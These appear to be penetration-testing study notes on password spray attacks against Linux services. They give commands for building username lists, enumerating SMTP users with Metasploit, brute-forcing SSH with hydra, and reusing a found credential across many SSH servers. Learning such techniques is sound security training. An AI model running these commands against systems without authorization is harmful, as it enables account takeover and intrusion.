# Notes - Linux Exploitation - Remote-Exploitation

## Password Spray Attack

- Create users list from this github `https://github.com/insidetrust/statistically-likely-usernames`:
```bash
head -n 50 john.txt >> users.txt
```
- User enumeration using `metasploit -> smtp_enum` and then put the users valid to a file `user_valid.txt`:
```bash
msf > use auxiliary/scanner/smtp/smtp_enum

> set RHOSTS <IP Target>
> set USER_FILE users.txt
> run
```
- SSH, SMTP and SMB are some services we can try our password spray attack against.
- Using `hydra` for brute force attack -> SSH:
```bash
hydra -L users.txt -P passwords.txt ssh://<IP target>
``` 
- Using credential against other systems on then network:
```bash
hydra -l pepito -p pepito123 -M ssh_servers.txt ssh

-M = to specify a list of ssh servers
```
